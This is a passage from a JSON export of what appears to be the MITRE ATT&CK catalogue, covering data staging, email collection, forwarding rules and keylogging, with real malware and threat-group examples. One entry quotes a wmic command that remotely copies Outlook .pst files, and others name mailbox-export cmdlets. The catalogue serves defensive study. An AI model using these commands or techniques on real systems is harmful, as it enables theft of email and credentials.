"description": "BackdoorDiplomacy has copied files of interest to the main drive's recycle bin."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS copies documents under 15MB found on the victim system to is the user's %temp%\\SMB\\ folder. It also copies files from USB devices to a predefined directory."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch stores collected data in log files before exfiltration."}, {"id": "S0651", "name": "BoxCaon", "description": "BoxCaon has created a working folder for collected files that it sends to the C2 server."}, {"id": "C0015", "name": "C0015", "description": "During C0015, PowerView's file share enumeration results were stored in the file c:\\ProgramData\\found_shares.txt."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 copied the local SAM and SYSTEM Registry hives to a staging directory."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used staging folders that are infrequently used by legitimate users or processes to store data for exfiltration and tool deployment."}, {"id": "S0274", "name": "Calisto", "description": "Calisto uses a hidden directory named .calisto to store data from the victim\u2019s machine before exfiltration."}, {"id": "S0335", "name": "Carbon", "description": "Carbon creates a base directory that contains the files and folders that are collected."}, {"id": "S0261", "name": "Catchamas", "description": "Catchamas stores the gathered data from the machine in .db files and .bmp files under four separate locations."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 can temporarily store files in a hidden directory on the local host."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has staged stolen data locally on compromised hosts."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can store captured screenshots to disk including to a covert store named APPX.%x%x%x%x%x.tmp where %x is a random value."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme can store captured system information locally prior to exfiltration."}, {"id": "S0538", "name": "Crutch", "description": "Crutch has staged stolen files in the C:\\AMD\\Temp directory."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer has staged collected application data from Safari, Notes, and Keychain to /var/folder."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can stage local data in the Windows Registry."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has created a directory named \"out\" in the user's %AppData% folder and copied files to it."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack can save collected data to disk, different file formats, and network shares."}, {"id": "S0038", "name": "Duqu", "description": "Modules can be pushed to and executed by Duqu that copy data to a staging area, compress it, and XOR encrypt it."}, {"id": "S0062", "name": "DustySky", "description": "DustySky created folders in temp directories to host collected files before exfiltration."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to create files in a TEMP folder to act as a database to store information."}, {"id": "S0593", "name": "ECCENTRICBANDWAGON", "description": "ECCENTRICBANDWAGON has stored keystrokes and screenshots within the %temp%\\GoogleChrome, %temp%\\Downloads, and %temp%\\TrendMicroUpdate directories."}, {"id": "S0081", "name": "Elise", "description": "Elise creates a file in AppData\\Local\\Microsoft\\Windows\\Explorer and stores all harvested data in that file."}, {"id": "S0343", "name": "Exaramel for Windows", "description": "Exaramel for Windows specifies a path to store files scheduled for exfiltration."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has utilized the following temporary folders on compromised Windows and Linux systems for their operations prior to exfiltration: C:\\Windows\\Temp and /tmp."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 scripts save memory dump data into a specific directory on hosts in the victim environment."}, {"id": "S0036", "name": "FLASHFLOOD", "description": "FLASHFLOOD stages data it copies from the local system or removable drives in the \"%WINDIR%\\$NtUninstallKB885884$\\\" directory."}, {"id": "S0503", "name": "FrameworkPOS", "description": "FrameworkPOS can identifiy payment card track data on the victim and copy it to a local file in a subdirectory of C:\\Windows."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can stage collected information including screen captures and logged keystrokes locally."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM compressed and staged files in multi-part archives in the Recycle Bin prior to exfiltration."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon stores information gathered from the endpoint in a file named 1.hwp."}, {"id": "S0170", "name": "Helminth", "description": "Helminth creates folders to store output from batch scripts prior to sending the information to its C2 server."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has stored collected data in a .tmp file."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole determines a working directory where it stores all the gathered data about the compromised machine."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar stages command output and collected data in files before exfiltration."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can save collected system information to a file named \"info\" before exfiltration."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has staged collected data files under C:\\Program Files\\Common Files\\System\\Ole DB\\."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK has piped the results from executed C2 commands to %TEMP%\\result2.dat on the local machine."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory, then compressed, encrypted, and uploaded to a C2 server."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used C:\\Windows\\Debug and C:\\Perflogs as staging directories."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron can store email data in files and directories specified in its configuration, such as C:\\Windows\\ServiceProfiles\\NetworkService\\appdata\\Local\\Temp\\."}, {"id": "S1101", "name": "LoFiSe", "description": "LoFiSe can save files to be evaluated for further exfiltration in the C:\\Programdata\\Microsoft\\ and    C:\\windows\\temp\\ folders. "}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can create a directory in %TEMP%\\ to stage data prior to exfilration."}, {"id": "S0409", "name": "Machete", "description": "Machete stores files and logs in a folder on the local drive."}, {"id": "S1016", "name": "MacMa", "description": "MacMa has stored collected files locally before exfiltration."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can place retrieved files into a destination directory."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can store collected data locally in a created .nfo file."}, {"id": "G0045", "name": "menuPass", "description": "menuPass stages data prior to exfiltration in multi-part archives, often saved in the Recycle Bin."}, {"id": "S0443", "name": "MESSAGETAP", "description": "MESSAGETAP stored targeted SMS messages that matched its target list in CSV files on the compromised system."}, {"id": "S1059", "name": "metaMain", "description": "metaMain has stored the collected system files in a working directory."}, {"id": "S1015", "name": "Milan", "description": "Milan has saved files prior to upload from a compromised host to folders beginning with the characters a9850d2f."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type has temporarily stored collected information to the files \"%AppData%\\{Unique Identifier}\\HOSTRURKLSR\" and \"%AppData%\\{Unique Identifier}\\NEWERSSEMP\"."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind saves information from its keylogging routine as a .zip file in the present working directory."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has stored a decoy PDF file within a victim's %temp% folder."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has stored collected credential files in c:\\windows\\temp prior to exfiltration. Mustang Panda has also stored documents for exfiltration in a hidden folder on USB drives."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT writes multiple outputs to a TMP file using the >> method."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has the ability to write collected data to a file created in the ./LOGS directory."}, {"id": "S1090", "name": "NightClub", "description": "NightClub has copied captured files and keystrokes to the %TEMP% directory of compromised hosts."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI can collect data from the victim and stage it in LOCALAPPDATA%\\MicroSoft Updatea\\uplog.tmp."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can copy specific files, webcam captures, and screenshots to local directories."}, {"id": "S0340", "name": "Octopus", "description": "Octopus has stored collected information in the Application Data directory on a compromised host."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE stages the output from command execution and collected files in specific folders before exfiltration."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, stolen data was copied into a text file using the format From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt prior to compression, encoding, and exfiltration."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors staged archived files in a temporary directory prior to exfiltration."}, {"id": "S1109", "name": "PACEMAKER", "description": "PACEMAKER has written extracted data to tmp/dsserver-check.statementcounters."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork copied all targeted files to a directory called index that was eventually uploaded to the C&C server."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy stages collected data in a text file."}, {"id": "S1012", "name": "PowerLess", "description": "PowerLess can stage stolen browser data in C:\\\\Windows\\\\Temp\\\\cup.tmp and keylogger data in C:\\\\Windows\\\\Temp\\\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka creates a directory, %USERPROFILE%\\AppData\\Local\\SKC\\, which is used to store collected log files."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon creates various subdirectories under %Temp%\\reports\\% and copies files to those subdirectories. It also creates a folder at C:\\Users\\\\AppData\\Roaming\\Microsoft\\store to store screenshot JPEG files."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY has saved information to a random temp file before exfil."}, {"id": "S0197", "name": "PUNCHTRACK", "description": "PUNCHTRACK aggregates collected data in a tmp file."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has stored stolen emails and other data into new folders prior to exfiltration."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use a file exfiltration tool to copy files to C:\\ProgramData\\Adobe\\temp prior to exfiltration."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can stage data prior to exfiltration in %APPDATA%\\Microsoft\\UserSetting and %APPDATA%\\Microsoft\\UserSetting\\MediaCache."}, {"id": "S0169", "name": "RawPOS", "description": "Data captured by RawPOS is placed in a temporary file under a directory named \"memdump\"."}, {"id": "S0090", "name": "Rover", "description": "Rover copies files from removable drives to C:\\system."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has collected stolen files in a temporary folder in preparation for exfiltration."}, {"id": "S1110", "name": "SLIGHTPULSE", "description": "SLIGHTPULSE has piped the output from executed commands to /tmp/1."}, {"id": "S1104", "name": "SLOWPULSE", "description": "SLOWPULSE can write logged ACE credentials to /home/perl/PAUS.pm in append mode, using the format string %s:%s\\n."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish can send output from whoami to a local temp file using the naming convention rad<5-hex-chars>.tmp."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT can store harvested data in a custom database under the %TEMP% directory."}, {"id": "S0035", "name": "SPACESHIP", "description": "SPACESHIP identifies files with certain extensions and copies them to a directory in the user's profile."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE has stored collected data in a file called stari.txt."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP has stored collected data under %<malware_execution_folder>%\\\\CrashLog.txt."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has aggregated collected credentials in text files before exfiltrating."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has locally staged encrypted archives for later exfiltration efforts."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can create directories to store plugin output and stage data for exfiltration."}, {"id": "S0647", "name": "Turian", "description": "Turian can store copied files in a specific directory prior to exfiltration."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used tmp files to stage gathered information."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer collects files matching certain criteria from the victim and stores them in a local directory for later exfiltration."}, {"id": "S1154", "name": "VersaMem", "description": "VersaMem staged captured credentials locally at /tmp/.temp.data."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has saved stolen files including the ntds.dit database and the SYSTEM and SECURITY Registry hives locally to the C:\\Windows\\Temp\\ directory."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has staged ZIP files in local directories such as, C:\\PerfLogs\\1\\ and C:\\User\\1\\ prior to exfiltration."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy stores all collected information in a single file before exfiltration."}]}, {"name": "Remote Data Staging", "description": "Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.", "detailed_description": "Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may Create Cloud Instance and stage data in that instance.\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.", "id": "T1074.002", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has staged archives of collected data on a target's Outlook Web Access (OWA) server."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 has copied files to a remote machine infected with Chinoxy or another backdoor."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has staged stolen data on designated servers in the target environment."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 actors have compressed data from remote systems and moved it to another staging system before exfiltration."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 aggregates staged data from a network into a single location."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has staged data remotely prior to exfiltration."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has staged data on remote MSP systems or other victim networks prior to exfiltration."}, {"id": "G1019", "name": "MoustachedBouncer", "description": "MoustachedBouncer has used plugins to save captured screenshots to .\\AActdata\\ on an SMB share."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors copied files to company web servers and subsequently downloaded them."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 staged data and files in password-protected archives on a victim's OWA server."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has moved staged encrypted archives to Internet-facing servers that had previously been compromised with China Chopper prior to exfiltration."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat manually transferred collected files to an exfiltration host using xcopy."}]}]}, {"name": "Email Collection", "description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients.", "detailed_description": "Adversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Emails may also contain details of ongoing incident response operations, which may allow adversaries to adjust their techniques in order to maintain persistence or evade defenses. Adversaries can collect or forward email from mail servers or clients.", "id": "T1114", "examples": [{"id": "G1003", "name": "Ember Bear", "description": "Ember Bear attempts to collect mail from accessed systems and servers."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed leveraging a module that can scrape email addresses from Outlook."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has compromised email credentials in order to steal sensitive data."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider threat actors search the victim\u2019s Microsoft Exchange for emails about the intrusion and incident response."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has exfiltrated entire mailboxes from compromised accounts."}], "sub_techniques": [{"name": "Local Email Collection", "description": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.", "detailed_description": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB. IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in C:\\Users\\<username>\\Documents\\Outlook Files or C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook.", "id": "T1114.001", "examples": [{"id": "G0006", "name": "APT1", "description": "APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has harvested data from victim's e-mail including through execution of wmic /node: process call create \"cmd /c copy c:\\Users\\\\\\backup.pst c:\\windows\\temp\\backup.pst\" copy \"i:\\\\\\My Documents\\.pst\"copy."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration."}, {"id": "S0115", "name": "Crimson", "description": "Crimson contains a command to collect and exfiltrate emails from Outlook."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed leveraging a module that scrapes email data from Outlook."}, {"id": "S0363", "name": "Empire", "description": "Empire has the ability to collect emails on a target system."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can harvest data from mail clients."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can capture the recipients of sent email messages from compromised accounts."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has collected .PST archives."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used RAT malware to exfiltrate email archives."}, {"id": "S0594", "name": "Out1", "description": "Out1 can parse e-mails on a target machine."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can interact with a victim\u2019s Outlook session and look through folders and emails."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can target and steal locally stored emails to support thread hijacking phishing campaigns."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has collected emails to use in future phishing campaigns."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader searches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.)."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern delivered malicious JavaScript payloads capable of exfiltrating email messages from exploited email servers."}]}, {"name": "Remote Email Collection", "description": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific keywords.", "detailed_description": "Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as MailSniper can be used to automate searches for specific keywords.", "id": "T1114.002", "examples": [{"id": "G0006", "name": "APT1", "description": "APT1 uses two utilities, GETMAIL and MAPIGET, to steal email. MAPIGET steals email still on Exchange servers that has not yet been archived."}, {"id": "G0007", "name": "APT28", "description": "APT28 has collected emails from victim Microsoft Exchange servers."}, {"id": "G0016", "name": "APT29", "description": "APT29 has collected emails from targeted mailboxes within a compromised Azure AD tenant and compromised Exchange servers, including via Exchange Web Services (EWS) API requests."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has harvested data from remote mailboxes including through execution of \\\\c$\\Users\\\\AppData\\Local\\Microsoft\\Outlook*.ost."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has accessed email accounts using Outlook Web Access."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has accessed and hijacked online email communications using stolen credentials."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used web shells to export mailbox data."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors made multiple HTTP POST requests to the Exchange servers of the victim organization to transfer data."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used compromised credentials and a .NET tool to dump data from Microsoft Exchange mailboxes."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used tools such as the MailFetch mail crawler to collect victim emails (excluding spam) from online services via IMAP."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer used a tool called MailSniper to search through the Exchange server mailboxes for keywords."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron collects Exchange emails matching rules specified in its configuration."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has exported emails from compromised Exchange servers including through use of the cmdlet New-MailboxExportRequest."}, {"id": "S0413", "name": "MailSniper", "description": "MailSniper can be used for searching through email in Exchange and Office 365 environments."}, {"id": "S0053", "name": "SeaDuke", "description": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 collected emails from specific individuals, such as executives and IT staff, using New-MailboxExportRequest followed by Get-MailboxExportRequest."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has remotely accessed victims' email accounts to steal messages and attachments."}, {"id": "S0476", "name": "Valak", "description": "Valak can collect sensitive mailing information from Exchange servers, including credentials and the domain certificate of an enterprise."}]}, {"name": "Email Forwarding Rule", "description": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations. Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators. Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.", "detailed_description": "Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim\u2019s organization to use as part of further exploits or operations. Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators. Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.\nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.\nIn some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives.", "id": "T1114.003", "examples": [{"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has set auto-forward rules on victim's e-mail accounts."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has set an Office 365 tenant level mail transport rule to send all mail in and out of the targeted organization to the newly created account."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has set up auto forwarding rules on compromised e-mail accounts."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has abused email forwarding rules to monitor the activities of a victim, steal information, and maintain persistent access after compromised credentials are reset."}]}]}, {"name": "Input Capture", "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).", "detailed_description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).", "id": "T1056", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 has utilized tools to capture mouse movements."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has a module to perform any API hooking it desires."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy can collect mouse events."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos has used a compromised SSH client to capture the hostname, port, username and password used to establish an SSH connection from the compromised host."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can conduct mouse event logging."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can log mouse events."}, {"id": "S1131", "name": "NPPSPY", "description": "NPPSPY captures user input into the Winlogon process by redirecting RPC traffic from legitimate listening DLLs within the operating system to a newly registered malicious item that allows for recording logon information in cleartext."}, {"id": "C0039", "name": "Versa Director Zero Day Exploitation", "description": "Versa Director Zero Day Exploitation intercepted and harvested credentials from user logins to compromised devices."}], "sub_techniques": [{"name": "Keylogging", "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.", "detailed_description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:", "id": "T1056.001", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. "}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL can perform keylogging."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can log keystrokes on the victim\u2019s machine."}, {"id": "G0130", "name": "Ajax Security Team", "description": "Ajax Security Team has used CWoolger and MPK, custom-developed malware, which recorded all keystrokes on an infected system."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can use GetKeyState and GetKeyboardState to capture keystrokes on the victim\u2019s machine."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used tools to perform keylogging."}, {"id": "G0022", "name": "APT3", "description": "APT3 has used a keylogging tool that records keystrokes in encrypted files."}, {"id": "G0050", "name": "APT32", "description": "APT32 has abused the PasswordChangeNotify to monitor for and capture account password changes."}, {"id": "G0082", "name": "APT38", "description": "APT38 used a Trojan called KEYLIME to capture keystrokes from the victim\u2019s machine."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used tools for capturing keystrokes."}, {"id": "G0096", "name": "APT41", "description": "APT41 used a keylogger called GEARSHIFT on a target system."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used malware with keylogging capabilities to monitor the communications of targeted entities."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth logs keystrokes from the victim's machine. "}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can capture keystrokes on the victim\u2019s machine."}, {"id": "S0438", "name": "Attor", "description": "One of Attor's plugins can collect user credentials via capturing keystrokes and can capture keystrokes pressed within the window of the injected process."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has a PowerShell-based remote administration ability that can implement a PowerShell or C# based keylogger."}, {"id": "S0128", "name": "BADNEWS", "description": "When it first starts, BADNEWS spawns a new thread to log keystrokes."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch has a keylogging capability."}, {"id": "S0234", "name": "Bandook", "description": "Bandook contains keylogging capabilities."}, {"id": "S0017", "name": "BISCUIT", "description": "BISCUIT can capture keystrokes."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has run a keylogger plug-in on a victim."}, {"id": "S0454", "name": "Cadelspy", "description": "Cadelspy has the ability to log keystrokes on the compromised host."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak logs key strokes for configured processes and sends them back to the C2 server."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT can log keystrokes."}, {"id": "S0261", "name": "Catchamas", "description": "Catchamas collects keystrokes from the victim\u2019s machine."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP has the ability to support keylogging."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK is capable of performing keylogging."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can capture keystrokes on a compromised host."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can track key presses with a keylogger module."}, {"id": "S0338", "name": "Cobian RAT", "description": "Cobian RAT has a feature to perform keylogging on the victim\u2019s machine."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke uses a keylogger."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can use a module to perform keylogging on compromised hosts."}, {"id": "S0625", "name": "Cuba", "description": "Cuba logs keystrokes via polling by using GetKeyState and VkKeyScan functions."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors modified a JavaScript file on the Web SSL VPN component of Ivanti Connect Secure devices to keylog credentials."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet has a keylogging capability."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate will spawn a thread on execution to capture all keyboard events and write them to a predefined log file."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has used a keylogger."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can download a keylogging module."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can track key presses with a keylogger module."}, {"id": "S0187", "name": "Daserf", "description": "Daserf can log keystrokes."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi is capable of logging keystrokes."}, {"id": "S0213", "name": "DOGCALL", "description": "DOGCALL is capable of logging keystrokes."}, {"id": "S0567", "name": 